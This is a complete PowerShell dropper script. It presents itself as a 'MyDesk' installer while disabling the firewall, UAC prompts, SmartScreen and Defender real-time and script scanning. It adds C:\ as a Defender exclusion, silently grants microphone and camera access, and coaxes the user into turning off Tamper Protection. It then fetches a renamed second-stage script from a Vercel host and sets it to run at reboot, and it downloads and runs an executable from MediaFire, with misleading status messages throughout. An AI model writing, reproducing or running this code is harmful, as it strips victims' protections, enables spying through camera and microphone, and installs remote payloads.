# Check for Administrator rights
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERROR: Please run this script as Administrator!" -ForegroundColor Red
    exit
}

# === SPEED FIX ===
$ProgressPreference = 'SilentlyContinue'

# ==========================================
# BLOCK 0: FIREWALL NUKE (ADDED)
# ==========================================
Write-Host "Initializing..." -ForegroundColor Cyan
try {
    Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction SilentlyContinue
    netsh advfirewall set allprofiles state off
}
catch {
    Write-Host "[-] Something off (1)..." -ForegroundColor Red
}

# ==========================================
# BLOCK 1: AGGRESSIVE PREPARATION
# ==========================================
# Write-Host "Initializing Revolution..." -ForegroundColor Cyan

# 1.1 Privilege Escalation
# Write-Host "Escalating Privileges..." -ForegroundColor Cyan
$Definition = @"
using System;
using System.Runtime.InteropServices;

public class PrivilegeManager {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }
}
"@
Add-Type -TypeDefinition $Definition -ErrorAction SilentlyContinue

$token = [IntPtr]::Zero
if ([PrivilegeManager]::OpenProcessToken([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x0020, [ref]$token)) {
    $privileges = @(
        "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", 
        "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", 
        "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", 
        "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", 
        "SeLockMemoryPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", 
        "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", 
        "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", 
        "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", 
        "SeUndockPrivilege"
    )

    foreach ($priv in $privileges) {
        $luid = 0
        if ([PrivilegeManager]::LookupPrivilegeValue($null, $priv, [ref]$luid)) {
            $tp = New-Object PrivilegeManager+TOKEN_PRIVILEGES
            $tp.PrivilegeCount = 1
            $tp.Luid = $luid
            $tp.Attributes = 0x00000002 # SE_PRIVILEGE_ENABLED
            [void][PrivilegeManager]::AdjustTokenPrivileges($token, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
        }
    }
}
Set-ExecutionPolicy Bypass -Scope Process -Force
if ($PSCommandPath) {
    Unblock-File -Path $PSCommandPath -ErrorAction SilentlyContinue
}

# 1.1.5 Enable Media Permissions (Mic/Cam)
# Write-Host "Forcing Media Permissions (Mic/Cam)..." -ForegroundColor Cyan
$CapPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore"
$UserCapPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore"
foreach ($cap in @("microphone", "webcam", "camera")) {
    # System-wide Allow (create key if missing)
    $key = "$CapPath\$cap"
    if (-not (Test-Path $key)) {
        New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
    }
    Set-ItemProperty -Path $key -Name "Value" -Value "Allow" -Type String -Force -ErrorAction SilentlyContinue
    
    # User specific Allow (create key if missing)
    $ukey = "$UserCapPath\$cap"
    if (-not (Test-Path $ukey)) {
        New-Item -Path $ukey -Force -ErrorAction SilentlyContinue | Out-Null
    }
    Set-ItemProperty -Path $ukey -Name "Value" -Value "Allow" -Type String -Force -ErrorAction SilentlyContinue
}


# 1.2 Disable UAC Prompts
Write-Host "Initializing Success..." -ForegroundColor Cyan
$UACKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $UACKey -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $UACKey -Name "ConsentPromptBehaviorUser" -Value 0 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $UACKey -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue

# 1.3 Add Exclusion
try {
    Write-Host "Attempting Preload Info..." -ForegroundColor Cyan
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
}
catch {
    Write-Host "[-] Something off (2)..." -ForegroundColor Red
}

# 1.4 Disable SmartScreen
Write-Host "Disabling unused Info..." -ForegroundColor Yellow
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force -Type DWord
# Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Name "SmartScreenEnabled" -Value 0 -Force -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -Type DWord

# 1.5 Cleanup Temp Folders
Write-Host "Cleaning Up..." -ForegroundColor Cyan
$TempPaths = @($env:TEMP, "$env:SystemRoot\Temp")
foreach ($Path in $TempPaths) {
    Get-ChildItem -Path $Path -Recurse -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# ==========================================
# BLOCK 2: TAMPER PROTECTION BARRIER
# ==========================================
$PrepScriptPath = "$env:ProgramData\RevolutionPrep.ps1"
# [USER] Links needed here!
# Link to the RAW content of 'revolution2.txt' (Hosted on Vercel)
# WE USE .txt EXTENSION TO BYPASS SOME FILTERS, SCRIPT WILL RENAME IT.
$PrepUrl = "https://mydesk-registry.vercel.app/revolution2.txt" 
$PayloadUrl = "https://download1593.mediafire.com/6ygh80yoxfjgmAdd46HUTtiIGs5j-5_LVR_UkkoQRMNKSAPDN7kG03GniheGLEvA0CnC5BBslf_vXpAmVn5Ey6PMt4kTqfyF5KthqjkQV1WnvFcRz3J4JnbFUw3Z3S0u8OHFYBe-RnFVYYZOASVCFyxPUjVSkxgFimKZPj25UiIlHow/76v0uxlwvbr30rk/MyDeskSetup.exe"
while ($true) {
    $Status = Get-MpComputerStatus
    if ($Status.IsTamperProtected -eq $false) {
        Write-Host "Match info FOUND..." -ForegroundColor Green
        break
    }

    Write-Host "`n[!] TAMPER PROTECTION IS ON [!]" -ForegroundColor Red
    Write-Host "[P] Proceed(Safeway)"
    Write-Host "[R] Retry: I manually disabled Tamper Protection"
    Write-Host "[E] Bypass anways (Not Recommended)" -ForegroundColor Yellow
    
    $Choice = Read-Host "Choose P or R or E"
    if ($Choice -eq 'P' -or $Choice -eq 'p') {
        Write-Host "Initializing Safeway..." -ForegroundColor Yellow
        
        # Download the Preparation Script from the User's Link
        # CRITICAL: Ensure $PrepUrl points to the UPDATED revolutionplan2.ps1
        Write-Host "Downloading Preperation..."
        try {
            Invoke-WebRequest -Uri $PrepUrl -OutFile $PrepScriptPath -UseBasicParsing -ErrorAction Stop
            Unblock-File -Path $PrepScriptPath -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "RevolutionPrep" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Maximized -File `"$PrepScriptPath`"" -Force
            
            Write-Host "Rebooting..." -ForegroundColor Green
            Start-Sleep -Seconds 3
            Restart-Computer -Force
            exit
        }
        catch {
            Write-Host "[!] Preperation Failed" -ForegroundColor Red
            exit
        }
    }
    elseif ($Choice -eq 'R' -or $Choice -eq 'r') {
        Write-Host "Retrying..."
        # Loop continues
    }
    elseif ($Choice -eq 'E' -or $Choice -eq 'e') {
        Write-Host "Bypassing..."
        break
    }
}

# ==========================================
# BLOCK 3: THE REVOLUTION (FAST PATH)
# ==========================================
# If we are here, TP is OFF. We run the payload NOW.
Write-Host "Trying to get true info..." -ForegroundColor Magenta

# 3.1 Disable Real-time
Write-Host "Cleaning up(again)..." -ForegroundColor Yellow
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
try { Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue } catch {}

# 3.2 Payload Execution (FAST PATH)
$SetupDest = "$env:TEMP\MyDeskSetup.exe"

Write-Host "Downloading..." -ForegroundColor Cyan
if ($PayloadUrl -match "YOUR_MEDIAFIRE") {
    Write-Host "[!] ERROR: Can't download" -ForegroundColor Red
}
else {
    try {
        Invoke-WebRequest -Uri $PayloadUrl -OutFile $SetupDest -UseBasicParsing
        Unblock-File -Path $SetupDest -ErrorAction SilentlyContinue
        
        if (Test-Path $SetupDest) {
            Write-Host "Installing..." -ForegroundColor Green
            Start-Process -FilePath $SetupDest -Wait
            Write-Host "Installed!" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[!] Download Failed!" -ForegroundColor Red
    }
}
Write-Host "FALTAL ERROR" -ForegroundColor Magenta
exit
